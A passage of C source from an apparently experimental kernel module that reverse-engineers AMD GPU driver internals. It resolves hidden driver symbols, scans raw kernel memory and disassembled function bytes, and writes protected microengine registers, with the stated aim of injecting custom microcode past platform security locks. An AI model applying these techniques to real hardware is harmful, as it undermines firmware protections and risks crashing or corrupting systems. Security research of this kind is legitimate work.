			ic_lo_kiq = p_rreg(adev, regCP_CPC_IC_BASE_LO);
			pr_info("fw36: IC_BASE MMIO: LO=0x%08X HI=0x%08X CNTL=0x%08X\n",
				ic_lo_mmio_before, ic_hi_mmio, ic_cntl_mmio);
			pr_info("fw36: IC_BASE KIQ:  LO=0x%08X (KIQ%s MMIO)\n",
				ic_lo_kiq, ic_lo_kiq == ic_lo_mmio_before ? "==" : "!=");

			/* Write IC_BASE_LO = orig XOR 0x1000 via KIQ, check MMIO */
			pr_info("fw36: KIQ wreg IC_BASE_LO = 0x%08X...\n",
				ic_lo_mmio_before ^ 0x1000);
			p_wreg(adev, regCP_CPC_IC_BASE_LO, ic_lo_mmio_before ^ 0x1000);
			udelay(200);
			{
				u32 after = rr(regCP_CPC_IC_BASE_LO);
				pr_info("fw36: IC_BASE_LO MMIO after: 0x%08X %s\n",
					after, after != ic_lo_mmio_before ?
					"*** CHANGED ***" : "UNCHANGED (PSP locked)");
				if (after != ic_lo_mmio_before) {
					p_wreg(adev, regCP_CPC_IC_BASE_LO, ic_lo_mmio_before);
					pr_info("fw36: RESTORED IC_BASE_LO\n");
				}
			}

			/* Write IC_BASE_CNTL via KIQ */
			pr_info("fw36: KIQ wreg IC_BASE_CNTL = 0x%08X...\n",
				ic_cntl_mmio ^ 0x10);
			p_wreg(adev, regCP_CPC_IC_BASE_CNTL, ic_cntl_mmio ^ 0x10);
			udelay(200);
			{
				u32 after = rr(regCP_CPC_IC_BASE_CNTL);
				pr_info("fw36: IC_BASE_CNTL MMIO after: 0x%08X %s\n",
					after, after != ic_cntl_mmio ?
					"*** CHANGED ***" : "UNCHANGED (PSP locked)");
				if (after != ic_cntl_mmio)
					p_wreg(adev, regCP_CPC_IC_BASE_CNTL, ic_cntl_mmio);
			}

			/* MEC_CNTL halt via KIQ */
			{
				u32 mec_cntl = rr(regCP_MEC_CNTL);
				pr_info("fw36: MEC_CNTL MMIO before = 0x%08X\n", mec_cntl);
				p_wreg(adev, regCP_MEC_CNTL, mec_cntl | (1 << 28));
				udelay(200);
				{
					u32 now = rr(regCP_MEC_CNTL);
					pr_info("fw36: MEC_CNTL MMIO after: 0x%08X %s\n",
						now, now != mec_cntl ?
						"*** CHANGED ***" : "UNCHANGED");
					if ((now >> 28) & 1) {
						p_wreg(adev, regCP_MEC_CNTL, mec_cntl);
						udelay(100);
						pr_info("fw36: MEC_CNTL restored to 0x%08X\n",
							rr(regCP_MEC_CNTL));
					}
				}
			}

			/* MDBASE_LO via KIQ */
			{
				u32 md_lo = rr(regCP_MEC_MDBASE_LO);
				pr_info("fw36: MDBASE_LO MMIO before = 0x%08X\n", md_lo);
				p_wreg(adev, regCP_MEC_MDBASE_LO, md_lo ^ 0x10000);
				udelay(200);
				{
					u32 now = rr(regCP_MEC_MDBASE_LO);
					pr_info("fw36: MDBASE_LO MMIO after: 0x%08X %s\n",
						now, now != md_lo ?
						"*** CHANGED ***" : "UNCHANGED");
					if (now != md_lo)
						p_wreg(adev, regCP_MEC_MDBASE_LO, md_lo);
				}
			}

			/* Try writing DC_BASE_CNTL to enable data cache */
			{
				u32 dc = rr(regCP_MEC_DC_BASE_CNTL);
				pr_info("fw36: DC_BASE_CNTL via MMIO = 0x%08X\n", dc);
				p_wreg(adev, regCP_MEC_DC_BASE_CNTL, 0x3);
				udelay(100);
				{
					u32 now = rr(regCP_MEC_DC_BASE_CNTL);
					pr_info("fw36: DC_BASE_CNTL after KIQ wreg: 0x%08X %s\n",
						now, now != dc ?
						"*** DC_BASE_CNTL CHANGED ***" : "unchanged");
					if (now != dc)
						p_wreg(adev, regCP_MEC_DC_BASE_CNTL, dc);
				}
			}
		} else {
			pr_info("fw36: kiq_wreg/rreg not found, skipping\n");
		}
	}

	/* ===========================================
	 * APPROACH F: Manual PM4 WRITE_DATA to memory
	 *
	 * amdgpu_kiq_wreg uses dst_sel=0 (register).
	 * We need dst_sel=5 (memory mapped, synchronous)
	 * to write to GPU memory addresses like MDBASE.
	 *
	 * Find the KIQ ring submission functions and
	 * manually construct a WRITE_DATA packet that
	 * writes to a GART address (which we can verify
	 * from the CPU side).
	 * =========================================== */
	pr_info("fw36: === APPROACH F: PM4 WRITE_DATA TO GART MEMORY ===\n");
	{
		typedef int (*fn_ring_alloc)(void *ring, unsigned ndw);
		typedef void (*fn_ring_commit)(void *ring);

		fn_ring_alloc p_alloc = (fn_ring_alloc)klookup("amdgpu_ring_alloc");
		fn_ring_commit p_commit = (fn_ring_commit)klookup("amdgpu_ring_commit");

		pr_info("fw36: ring_alloc=%pS ring_commit=%pS\n", p_alloc, p_commit);

		if (p_alloc && p_commit) {
			/* We need the KIQ ring pointer. Find it via adev->gfx.kiq[0].ring.
			 * From the approach A scan, we know gpu_addr=0x7FFF00649000
			 * is at adev+0x16AF0. The ring struct starts much earlier.
			 *
			 * Actually, adev->gfx.kiq[0] is a struct amdgpu_kiq which
			 * contains the ring as a nested struct. The ring->ring buffer
			 * CPU pointer is at adev+0x16AC8 (kptr 0xFFFF8B4D0A75A000).
			 *
			 * But we need the actual address of the ring STRUCT, not the
			 * ring buffer. We need &adev->gfx.kiq[0].ring.
			 *
			 * From kernel source, amdgpu_kiq has:
			 *   +0: eop_gpu_addr (u64)
			 *   +8: eop_obj (ptr)
			 *   +16: ring_lock (spinlock, ~4-8 bytes)
			 *   +20 or +24: ring (nested struct amdgpu_ring, ~600+ bytes)
			 *
			 * The KIQ gpu_addr (0x7FFF00649000) is a field inside ring,
			 * specifically ring.gpu_addr. In amdgpu_ring, gpu_addr is
			 * after ring_obj, ring (buffer ptr), rptr_offs, rptr_gpu_addr,
			 * rptr_cpu_addr, wptr, wptr_old, ring_size, max_dw, count_dw.
			 *
			 * If ring starts at adev+X, then gpu_addr is at adev+X+offset.
			 * We found gpu_addr at adev+0x16AF0.
			 *
			 * Alternative: use kallsyms to find a function that returns
			 * the KIQ ring pointer directly. */

			/* Search for adev->gfx offset by looking for the kiq
			 * ring struct. The key insight is that amdgpu_ring_alloc
			 * takes a struct amdgpu_ring*, not an adev. We need to
			 * find the ring struct address.
			 *
			 * From the wider context dump:
			 * adev+0x16958: {0x00000001, 0x0000C040, 0x0000C041, 0x0000C042, ...}
			 * These look like register offsets — part of the ring_funcs
			 * or an indexed register table.
			 *
			 * Let's try a different approach: look for the amdgpu_ring
			 * struct by finding 'adev' pointer as first field. */

			/* Actually, let's use the simplest possible approach:
			 * amdgpu_kiq_wreg internally calls amdgpu_ring_alloc on
			 * the KIQ ring. Let's look at how it finds the ring. */

			/* From kernel source, amdgpu_kiq_wreg does:
			 *   struct amdgpu_kiq *kiq = &adev->gfx.kiq[0];
			 *   struct amdgpu_ring *ring = &kiq->ring;
			 *   spin_lock(&kiq->ring_lock);
			 *   amdgpu_ring_alloc(ring, ...);
			 *   amdgpu_ring_write(ring, ...);
			 *   amdgpu_ring_commit(ring);
			 *   spin_unlock(&kiq->ring_lock);
			 *
			 * So we need to figure out the gfx offset in adev,
			 * then the kiq offset in gfx. */

			/* Let's try: allocate a DMA buffer, write our canary
			 * to it via the GPU (WRITE_DATA with dst_sel=5),
			 * then verify from CPU side.
			 *
			 * For now, use the EOP buffer (adev+0x16AD8 = 0x1)
			 * as a known GART address to write to. The EOP addr
			 * is in GART range. */

			/* Actually, the simplest test: use amdgpu_kiq_wreg to
			 * write to DM_INDEX registers and see if DM access
			 * works when done through PM4 path.
			 *
			 * DM_INDEX accesses MEC data memory.
			 * From MMIO it returns 0xFF.
			 * But maybe from PM4 it works? */

			typedef void (*fn_kiq_wreg)(void *adev, u32 reg, u32 val);
			typedef u32  (*fn_kiq_rreg)(void *adev, u32 reg);
			fn_kiq_wreg p_wreg = (fn_kiq_wreg)klookup("amdgpu_kiq_wreg");
			fn_kiq_rreg p_rreg = (fn_kiq_rreg)klookup("amdgpu_kiq_rreg");

			if (p_wreg && p_rreg) {
				/* Test DM_INDEX access through KIQ */
				u32 dm_addr, dm_data;

				/* Write DM address through KIQ */
				p_wreg(adev, regCP_MEC_DM_INDEX_ADDR, 0x0);
				udelay(100);
				dm_addr = p_rreg(adev, regCP_MEC_DM_INDEX_ADDR);
				pr_info("fw36: DM addr via KIQ: wrote 0x0, read back 0x%08X\n",
					dm_addr);

				/* Try reading DM_DATA after setting addr */
				dm_data = rr(regCP_MEC_DM_INDEX_DATA);
				pr_info("fw36: DM_DATA via MMIO after KIQ addr set: 0x%08X\n",
					dm_data);

				/* Try DC_OP_CNTL to trigger data cache operation */
				{
					u32 dc_op = rr(regCP_MEC_DC_OP_CNTL);
					pr_info("fw36: DC_OP_CNTL orig = 0x%08X\n", dc_op);
					p_wreg(adev, regCP_MEC_DC_OP_CNTL, 0x1); /* invalidate */
					udelay(100);
					{
						u32 now = rr(regCP_MEC_DC_OP_CNTL);
						pr_info("fw36: DC_OP_CNTL after KIQ: 0x%08X\n", now);
					}
				}
			}
		}
	}

	/* ===========================================
	 * APPROACH G: Identify actual ring struct addr
	 *
	 * We need the actual pointer to struct amdgpu_ring
	 * for the KIQ to call ring_alloc/ring_write/ring_commit
	 * directly. Let's find it by scanning for the adev
	 * pointer as the first field of the ring struct.
	 * =========================================== */
	pr_info("fw36: === APPROACH G: FIND KIQ RING STRUCT ADDR ===\n");
	{
		/* The first field of struct amdgpu_ring is:
		 *   struct amdgpu_device *adev;
		 *
		 * And the second field is:
		 *   const struct amdgpu_ring_funcs *funcs;
		 *
		 * So we look for: [adev_ptr] [kptr (funcs)] at offset
		 * between 0x16500 and 0x16B00 (before gpu_addr at 0x16AF0).
		 *
		 * The ring struct should contain adev as first member. */

		u64 adev_val = (u64)adev;
		int off;
		int found = 0;

		for (off = 0x16500; off < 0x16AF0; off += 8) {
			u64 v = *(u64 *)((u8 *)adev + off);
			if (v == adev_val) {
				u64 funcs = *(u64 *)((u8 *)adev + off + 8);
				if ((funcs >> 48) == 0xFFFF && funcs != 0xFFFFFFFFFFFFFFFFULL) {
					pr_info("fw36: KIQ ring struct at adev+0x%X: "
						"adev=%pS funcs=%pS\n",
						off, (void *)v, (void *)funcs);

					/* Verify by checking known fields */
					{
						int delta = 0x16AF0 - off;
						pr_info("fw36:   ring_struct to gpu_addr delta: %d (0x%X)\n",
							delta, delta);
						pr_info("fw36:   Ring struct addr: 0x%llX\n",
							(u64)((u8 *)adev + off));

						/* Now we can compute offsets for critical fields.
						 * gpu_addr is at ring_struct + delta bytes.
						 * This tells us the kernel's compiled struct layout. */
					}
					found = 1;
					break;
				}
			}
		}

		if (!found) {
			/* Broader search */
			for (off = 0x14000; off < 0x16AF0; off += 8) {
				u64 v = *(u64 *)((u8 *)adev + off);
				if (v == adev_val) {
					u64 funcs = *(u64 *)((u8 *)adev + off + 8);
					if ((funcs >> 48) == 0xFFFF) {
						pr_info("fw36: Ring struct candidate at adev+0x%X "
							"funcs=0x%llX\n", off, funcs);
						found++;
						if (found >= 5) break;
					}
				}
			}
		}
	}

skip_inject:
	pr_info("fw36: === MODE 19 COMPLETE ===\n");
	pr_info("fw36: Final PC = 0x%04X (orig 0x%04X)\n",
		rr(regCP_MEC1_INSTR_PNTR), pc_orig);
	#undef GC0
}

/* ==========================================================================
 * MODE 20: KIQ Ring Submit — Manual PM4 injection via ring struct discovery
 *
 * Strategy:
 *   A) Disassemble amdgpu_kiq_wreg to extract KIQ ring struct offset from adev
 *   B) Allocate DMA buffer, write canary via PM4 WRITE_DATA dst_sel=5
 *   C) If memory write works: write custom MEC microcode to DMA buffer
 *   D) Use MAP_QUEUES to redirect a compute queue to our code
 * ========================================================================== */
/* MM_INDEX indirect MMIO/VRAM read/write (works for addresses beyond BAR) */
#define mmMM_INDEX    0x0000
#define mmMM_DATA     0x0001
#define mmMM_INDEX_HI 0x0006

static u32 vram_read32(u64 addr)
{
	writel((u32)(addr) | 0x80000000, mmio + mmMM_INDEX * 4);
	writel((u32)(addr >> 31), mmio + mmMM_INDEX_HI * 4);
	return readl(mmio + mmMM_DATA * 4);
}

static void vram_write32(u64 addr, u32 val)
{
	writel((u32)(addr) | 0x80000000, mmio + mmMM_INDEX * 4);
	writel((u32)(addr >> 31), mmio + mmMM_INDEX_HI * 4);
	writel(val, mmio + mmMM_DATA * 4);
}

static void kiq_ring_submit(void *psp, void *adev)
{
	u32 gc_base0 = find_gc_base0(adev);
	u32 pc_orig;

	if (!gc_base0) return;
	#define GC0(r) (gc_base0 + (r))

	pc_orig = rr(regCP_MEC1_INSTR_PNTR);
	pr_info("fw36: === MODE 20: KIQ RING SUBMIT ===\n");
	pr_info("fw36: MEC PC = 0x%04X\n", pc_orig);

	/* ===========================================
	 * APPROACH A: Disassemble amdgpu_kiq_wreg to
	 * find the offset to kiq ring struct in adev.
	 *
	 * amdgpu_kiq_wreg(adev, reg, val) does:
	 *   kiq = &adev->gfx.kiq[0];
	 *   ring = &kiq->ring;
	 *   spin_lock(&kiq->ring_lock);
	 *   amdgpu_ring_alloc(ring, 32);
	 *   ...
	 *
	 * The compiler generates something like:
	 *   lea r??, [rdi + OFFSET]  ; rdi = adev, OFFSET = gfx.kiq[0]
	 *
	 * We dump first 128 bytes of the function and
	 * look for large offsets (0x1XXXX range).
	 * =========================================== */
	pr_info("fw36: === APPROACH A: DISASSEMBLE amdgpu_kiq_wreg ===\n");
	{
		unsigned long wreg_addr = klookup("amdgpu_kiq_wreg");
		if (wreg_addr) {
			u8 *code = (u8 *)wreg_addr;
			int i;
			int ring_offset = -1;

			/* Hex dump first 128 bytes */
			pr_info("fw36: amdgpu_kiq_wreg at 0x%lX:\n", wreg_addr);
			for (i = 0; i < 128; i += 16) {
				pr_info("fw36:   +%03X: %02X%02X%02X%02X %02X%02X%02X%02X "
					"%02X%02X%02X%02X %02X%02X%02X%02X\n",
					i,
					code[i+0], code[i+1], code[i+2], code[i+3],
					code[i+4], code[i+5], code[i+6], code[i+7],
					code[i+8], code[i+9], code[i+10], code[i+11],
					code[i+12], code[i+13], code[i+14], code[i+15]);
			}

			/* Scan for LEA rXX, [rdi + imm32] patterns.
			 * x86-64: REX.W (48/4C) + 8D + ModRM + SIB? + disp32
			 * LEA reg, [rdi+disp32] = REX 8D {87,8F,97,...} + 4-byte offset
			 * REX.W + 8D + 87 = lea rax, [rdi+disp32]
			 * REX.W + 8D + 8F = lea rcx, [rdi+disp32]
			 * REX.W + 8D + 97 = lea rdx, [rdi+disp32]
			 * REX.W + 8D + B7 = lea rsi, [rdi+disp32]
			 * REX.W + 8D + BF = lea rdi, [rdi+disp32]
			 * 4C 8D + xx = lea r8-r15
			 */
			for (i = 0; i < 120; i++) {
				if ((code[i] == 0x48 || code[i] == 0x4C) &&
				    code[i+1] == 0x8D) {
					u8 modrm = code[i+2];
					u8 mod = modrm >> 6;
					u8 rm = modrm & 7;

					/* mod=10 (disp32), rm=7 (rdi) or rm=4 (SIB) */
					if (mod == 2 && rm == 7) {
						/* Direct [rdi+disp32] */
						u32 disp = *(u32 *)(code + i + 3);
						if (disp > 0x10000 && disp < 0x80000) {
							pr_info("fw36: LEA at +%d: [rdi+0x%X] "
								"(KIQ offset candidate)\n",
								i, disp);
							if (ring_offset < 0)
								ring_offset = disp;
						}
					} else if (mod == 2 && rm == 4) {
						/* SIB byte follows */
						u8 sib = code[i+3];
						u8 base = sib & 7;
						if (base == 7) { /* base=rdi */
							u32 disp = *(u32 *)(code + i + 4);
							if (disp > 0x10000 && disp < 0x80000) {
								pr_info("fw36: LEA+SIB at +%d: "
									"[rdi+0x%X]\n", i, disp);
								if (ring_offset < 0)
									ring_offset = disp;
							}
						}
					}
				}
				/* Also check ADD rdi, imm32 pattern:
				 * 48 81 C7 xx xx xx xx */
				if (code[i] == 0x48 && code[i+1] == 0x81 &&
				    code[i+2] == 0xC7) {
					u32 imm = *(u32 *)(code + i + 3);
					if (imm > 0x10000 && imm < 0x80000) {
						pr_info("fw36: ADD rdi,0x%X at +%d "
							"(KIQ offset candidate)\n",
							imm, i);
						if (ring_offset < 0)
							ring_offset = imm;
					}
				}
			}

			/* From disassembly:
			 * +040: 49 69 C5 58 03 00 00 = IMUL r8, r13, 0x358
			 *        sizeof(amdgpu_kiq) = 0x358
			 * +047: 48 8B 84 03 C8 6D 01 00 = MOV rax, [rbx+rax+0x16DC8]
			 *        adev->gfx.kiq[0] pointer at adev+0x16DC8
			 * +04F: 48 83 B8 E0 00 00 00 00 = CMP [rax+0xE0], 0
			 *        Checking kiq[0]+0xE0 for non-NULL (ring.funcs?)
			 *
			 * So kiq base is loaded from adev+0x16DC8, then deref'd.
			 * That means adev+0x16DC8 is a POINTER to kiq, or the
			 * beginning of an array of pointers.
			 *
			 * OR: the MOV loads the value AT adev+0x16DC8 into rax,
			 * which is the kiq struct itself (not a pointer to it).
			 * Then [rax+0xE0] checks a field within kiq.
			 *
			 * Wait — 48 8B 84 03 means MOV rax, [rbx + rax + disp32].
			 * rbx = adev, rax = kiq_index*0x358.
			 * So this loads from adev + kiq_index*0x358 + 0x16DC8.
			 * For index 0: adev + 0x16DC8.
			 * But it's an 8-byte MOV (loading a pointer).
			 *
			 * This loads a POINTER from adev+0x16DC8, then checks
			 * [that_pointer + 0xE0]. So adev+0x16DC8 holds a pointer
			 * to the kiq struct or something related.
			 *
			 * Let's probe it. */

			{
				u64 kiq_ptr_val = *(u64 *)((u8 *)adev + 0x16DC8);
				pr_info("fw36: adev+0x16DC8 = 0x%llX %s\n",
					kiq_ptr_val,
					(kiq_ptr_val >> 48) == 0xFFFF ? "(kptr)" :
					kiq_ptr_val == 0 ? "(NULL)" : "");

				/* Also check surrounding words for context */
				{
					int j;
					for (j = -32; j <= 64; j += 8) {
						u64 v = *(u64 *)((u8 *)adev + 0x16DC8 + j);
						if (v != 0) {
							pr_info("fw36: adev+0x%X = 0x%llX%s\n",
								(int)(0x16DC8 + j), v,
								(v >> 48) == 0xFFFF ? " (kptr)" :
								v == (u64)adev ? " (adev!)" : "");
						}
					}
				}

				/* If kiq_ptr_val is a valid kernel pointer, dereference it */
				if ((kiq_ptr_val >> 48) == 0xFFFF) {
					u8 *kiq = (u8 *)kiq_ptr_val;
					u64 at_e0 = *(u64 *)(kiq + 0xE0);
					pr_info("fw36: kiq[0xE0] = 0x%llX %s\n",
						at_e0,
						(at_e0 >> 48) == 0xFFFF ? "(kptr/funcs?)" : "");

					/* Scan kiq struct for adev pointer and gpu_addr */
					{
						int k;
						for (k = 0; k < 0x358; k += 8) {
							u64 v = *(u64 *)(kiq + k);
							if (v == (u64)adev) {
								pr_info("fw36: kiq+0x%X = adev *** RING START? ***\n", k);
							} else if (v == 0x7FFF00649000ULL) {
								pr_info("fw36: kiq+0x%X = gpu_addr 0x7FFF00649000 *** GPU_ADDR ***\n", k);
							} else if (v == 0xFFFF8B4D0A75A000ULL) {
								pr_info("fw36: kiq+0x%X = ring_buf_ptr\n", k);
							}
						}
					}

					/* Dump key kiq fields (first 256 bytes) */
					{
						int k;
						pr_info("fw36: KIQ struct dump:\n");
						for (k = 0; k < 0x180; k += 32) {
							u64 a = *(u64 *)(kiq + k);
							u64 b = *(u64 *)(kiq + k + 8);
							u64 c = *(u64 *)(kiq + k + 16);
							u64 d = *(u64 *)(kiq + k + 24);
							if (a || b || c || d) {
								pr_info("fw36:   +0x%03X: %016llX %016llX "
									"%016llX %016llX\n",
									k, a, b, c, d);
							}
						}
					}
				}
			}

			if (ring_offset > 0) {
				pr_info("fw36: Best KIQ ring struct offset: adev+0x%X\n",
					ring_offset);
			}

			/* === PHASE 2: Find ALL ring structs by scanning for adev pointer ===
			 * struct amdgpu_ring has adev as first field, funcs as second.
			 * Scan adev+0x10000..0x20000 for *(u64*)(adev+X) == adev,
			 * then verify *(u64*)(adev+X+8) is a kernel function pointer. */
			{
				int scan_off;
				int ring_count = 0;
				int kiq_ring_off = -1;
				u64 kiq_funcs_ptr = 0;

				/* First find kiq_pm4_funcs or gfx_v12_0_kiq_ring_funcs
				 * to identify the KIQ ring */
				unsigned long kiq_funcs_sym = klookup("gfx_v12_0_kiq_ring_funcs");
				if (!kiq_funcs_sym)
					kiq_funcs_sym = klookup("amdgpu_kiq_ring_funcs");

				pr_info("fw36: === PHASE 2: RING STRUCT SCAN (adev ptr match) ===\n");
				pr_info("fw36: Looking for adev=%p in adev+0x10000..0x20000\n",
					adev);
				if (kiq_funcs_sym)
					pr_info("fw36: KIQ ring funcs at 0x%lX\n", kiq_funcs_sym);
				else
					pr_info("fw36: KIQ ring funcs symbol not found, will ID by elimination\n");

				for (scan_off = 0x10000; scan_off < 0x20000 && ring_count < 30; scan_off += 8) {
					u64 v = *(u64 *)((u8 *)adev + scan_off);
					if (v == (u64)adev) {
						/* Potential ring->adev. Check ring->funcs at +8 */
						u64 funcs = *(u64 *)((u8 *)adev + scan_off + 8);
						int is_kptr = ((funcs >> 48) == 0xFFFF);

						if (is_kptr && funcs != 0) {
							/* Read some ring fields to identify */
							u64 gpu_addr = 0;
							u64 buf_ptr = 0;
							u64 wptr_v = 0;
							u32 ring_size = 0;
							u32 buf_mask = 0;
							u32 me_v = 0, pipe_v = 0, queue_v = 0;
							u32 doorbell = 0;
							char *ring_type = "unknown";
							int j;

							/* Scan within this ring struct (up to +0x300)
							 * for gpu_addr (0x7FFF range) and buffer kptr */
							for (j = 16; j < 0x300; j += 8) {
								u64 fv = *(u64 *)((u8 *)adev + scan_off + j);
								/* gpu_addr is typically in 0x7FFF range */
								if ((fv >> 32) == 0x7FFF && gpu_addr == 0)
									gpu_addr = fv;
								/* ring buffer is a kernel heap ptr */
								if (((fv >> 48) == 0xFFFF) &&
								    ((fv & 0xFFF) == 0) &&
								    fv != (u64)adev && fv != funcs &&
								    buf_ptr == 0 && j > 16 && j < 0x100)
									buf_ptr = fv;
							}

							/* Check if funcs matches KIQ ring funcs */
							if (kiq_funcs_sym && funcs == kiq_funcs_sym) {
								ring_type = "*** KIQ ***";
								kiq_ring_off = scan_off;
								kiq_funcs_ptr = funcs;
							}

							pr_info("fw36: RING at adev+0x%X: funcs=0x%llX "
								"gpu=0x%llX buf=0x%llX %s\n",
								scan_off, funcs, gpu_addr, buf_ptr,
								ring_type);

							ring_count++;
						}
					}
				}

				pr_info("fw36: Found %d ring structs\n", ring_count);

				/* If we didn't find KIQ by funcs symbol, try identifying
				 * by the known gpu_addr 0x7FFF00649000 from mode 18.
				 * Also scan wider range (0x8000..0x25000). */
				if (kiq_ring_off < 0) {
					pr_info("fw36: KIQ not found by funcs. Scanning for known gpu_addr...\n");
					/* First check if 0x7FFF00649000 exists ANYWHERE */
					for (scan_off = 0x8000; scan_off < 0x25000; scan_off += 8) {
						u64 v = *(u64 *)((u8 *)adev + scan_off);
						if (v == 0x7FFF00649000ULL) {
							pr_info("fw36: FOUND gpu_addr 0x7FFF00649000 at adev+0x%X\n",
								scan_off);
						}
					}
					/* Also try matching by the ring at adev+0x16DC0.
					 * It might BE the KIQ ring. Check its funcs vtable
					 * for kiq-specific function pointers. */
					{
						u64 f0 = *(u64 *)((u8 *)adev + 0x16DC8); /* funcs ptr */
						if ((f0 >> 48) == 0xFFFF) {
							/* Dump the funcs vtable name if possible.
							 * Check if any funcs entry matches known kiq functions. */
							unsigned long kiq_map = klookup("gfx_v12_0_kiq_map_queues");
							unsigned long kiq_unmap = klookup("gfx_v12_0_kiq_unmap_queues");
							unsigned long kiq_query = klookup("gfx_v12_0_kiq_query_status");
							u8 *ft = (u8 *)f0;
							int fi;
							int is_kiq = 0;

							pr_info("fw36: Ring at adev+0x16DC0 funcs vtable:\n");
							for (fi = 0; fi < 0x100; fi += 8) {
								u64 fv = *(u64 *)(ft + fi);
								if (fv && (fv >> 48) == 0xFFFF) {
									char *label = "";
									if (kiq_map && fv == kiq_map) {
										label = " *** KIQ_MAP_QUEUES ***";
										is_kiq = 1;
									}
									if (kiq_unmap && fv == kiq_unmap) {
										label = " *** KIQ_UNMAP ***";
										is_kiq = 1;
									}
									if (kiq_query && fv == kiq_query) {
										label = " *** KIQ_QUERY ***";
										is_kiq = 1;
									}
									pr_info("fw36:   ftab[+0x%02X] = 0x%llX%s\n",
										fi, fv, label);
								}
							}
							if (is_kiq) {
								pr_info("fw36: *** Ring at adev+0x16DC0 confirmed KIQ by pmf ***\n");
							}
							/* From disassembly: amdgpu_kiq_wreg loads
							 * funcs from adev+0x16DC8 = ring@0x16DC0->funcs.
							 * This IS the KIQ ring regardless of pmf match. */
							kiq_ring_off = 0x16DC0;
							kiq_funcs_ptr = f0;
							pr_info("fw36: *** Ring at adev+0x16DC0 IS KIQ (from disasm) ***\n");
						}
					}

					/* Walk backward from known gpu_addr locations to find
					 * the ring struct start (ring->adev as first field).
					 * Check both 0x16AF0 and 0x191A0. */
					{
						int gpu_locs[] = {0x16AF0, 0x191A0};
						int gi;
						for (gi = 0; gi < 2 && kiq_ring_off < 0; gi++) {
							int gloc = gpu_locs[gi];
							int back;
							pr_info("fw36: Walking back from gpu_addr at adev+0x%X:\n", gloc);
							/* Dump 0x100 bytes before gpu_addr for context */
							for (back = 0x100; back >= 0; back -= 8) {
								u64 bv = *(u64 *)((u8 *)adev + gloc - back);
								if (bv != 0) {
									char *tag = "";
									if (bv == (u64)adev) tag = " *** ADEV ***";
									else if ((bv >> 48) == 0xFFFF) tag = " (kptr)";
									else if ((bv >> 32) == 0x7FFF) tag = " (gpu_addr)";
									pr_info("fw36:   adev+0x%X = 0x%llX%s\n",
										gloc - back, bv, tag);
								}
							}
						}
					}

					/* Fallback: scan for gpu_addr pattern */
					for (scan_off = 0x8000; scan_off < 0x25000; scan_off += 8) {
						u64 v = *(u64 *)((u8 *)adev + scan_off);
						if (v == 0x7FFF00649000ULL && kiq_ring_off < 0) {
							/* Found the KIQ gpu_addr. Walk backward
							 * to find ring->adev (first field) */
							int back;
							for (back = 8; back < 0x200; back += 8) {
								u64 bv = *(u64 *)((u8 *)adev + scan_off - back);
								if (bv == (u64)adev) {
									u64 bf = *(u64 *)((u8 *)adev + scan_off - back + 8);
									if ((bf >> 48) == 0xFFFF) {
										kiq_ring_off = scan_off - back;
										kiq_funcs_ptr = bf;
										pr_info("fw36: KIQ ring at adev+0x%X "
											"(gpu_addr at +0x%X within ring)\n",
											kiq_ring_off, back);
										break;
									}
								}
							}
							if (kiq_ring_off >= 0) break;
						}
					}
				}

				/* === PHASE 3: Dump KIQ ring struct fields === */
				if (kiq_ring_off >= 0) {
					u8 *kr = (u8 *)adev + kiq_ring_off;
					int k;

					pr_info("fw36: === KIQ RING STRUCT at adev+0x%X ===\n",
						kiq_ring_off);

					/* Dump first 0x400 bytes in 32-byte rows */
					for (k = 0; k < 0x400; k += 32) {
						u64 a = *(u64 *)(kr + k);
						u64 b = *(u64 *)(kr + k + 8);
						u64 c = *(u64 *)(kr + k + 16);
						u64 d = *(u64 *)(kr + k + 24);
						if (a || b || c || d) {
							pr_info("fw36: KIQ+0x%03X: %016llX %016llX "
								"%016llX %016llX\n",
								k, a, b, c, d);
						}
					}

					/* Identify key fields by scanning.
					 * struct amdgpu_ring layout (approx):
					 * +0x00: adev (verified)
					 * +0x08: funcs
					 * +0x10: fence_drv (embedded struct, big)
					 * ...
					 * +0xN:  ring (u32* buffer)
					 * +0xN+8: ring_obj (bo)
					 * +0xN+16: gpu_addr (u64)
					 * +0xN+24: ring_size (u32)
					 * +0xN+28: buf_mask (u32)
					 * +0xM:  wptr (u64)
					 * +0xM+8: wptr_old (u64)
					 *
					 * We know gpu_addr. Find it, then derive others. */
					{
						int gpu_off = -1;
						for (k = 16; k < 0x300; k += 8) {
							u64 fv = *(u64 *)(kr + k);
							if (fv == 0x7FFF00649000ULL ||
							    ((fv >> 32) == 0x7FFF && (fv & 0xFFF) == 0)) {
								gpu_off = k;
								pr_info("fw36: KIQ ring gpu_addr at +0x%X = 0x%llX\n",
									k, fv);
								break;
							}
						}

						if (gpu_off > 0) {
							/* ring buffer kptr should be at gpu_off - 16 or gpu_off - 8 */
							u64 buf_at_m16 = *(u64 *)(kr + gpu_off - 16);
							u64 buf_at_m8 = *(u64 *)(kr + gpu_off - 8);
							u64 ring_buf_ptr = 0;
							int buf_off = -1;

							if ((buf_at_m16 >> 48) == 0xFFFF && (buf_at_m16 & 0xFFF) == 0) {
								ring_buf_ptr = buf_at_m16;
								buf_off = gpu_off - 16;
							} else if ((buf_at_m8 >> 48) == 0xFFFF && (buf_at_m8 & 0xFFF) == 0) {
								ring_buf_ptr = buf_at_m8;
								buf_off = gpu_off - 8;
							}

							if (ring_buf_ptr) {
								pr_info("fw36: KIQ ring->ring (buf) at +0x%X = 0x%llX\n",
									buf_off, ring_buf_ptr);
							}

							/* ring_size at gpu_off + 8 (u32), buf_mask at gpu_off + 12 (u32) */
							{
								u32 rs = *(u32 *)(kr + gpu_off + 8);
								u32 bm = *(u32 *)(kr + gpu_off + 12);
								pr_info("fw36: KIQ ring_size=0x%X (%u) buf_mask=0x%X\n",
									rs, rs, bm);
							}

							/* Scan for wptr: look for small u64 values
							 * (wptr is a counter, typically < 0x10000)
							 * in range gpu_off+16 .. gpu_off+64 */
							for (k = gpu_off + 16; k < gpu_off + 80; k += 8) {
								u64 wv = *(u64 *)(kr + k);
								if (wv > 0 && wv < 0x100000) {
									pr_info("fw36: KIQ wptr candidate at +0x%X = %llu\n",
										k, wv);
								}
							}

							/* me/pipe/queue are u32s, typically in a known
							 * range past wptr. Scan for small ints (0-7) */
							for (k = gpu_off + 80; k < gpu_off + 200; k += 4) {
								u32 sv = *(u32 *)(kr + k);
								u32 nv = *(u32 *)(kr + k + 4);
								u32 mv = *(u32 *)(kr + k + 8);
								/* me=0-1, pipe=0-3, queue=0-7 pattern */
								if (sv <= 3 && nv <= 7 && mv <= 15 &&
								    (sv + nv + mv) > 0 &&
								    (sv + nv + mv) < 20) {
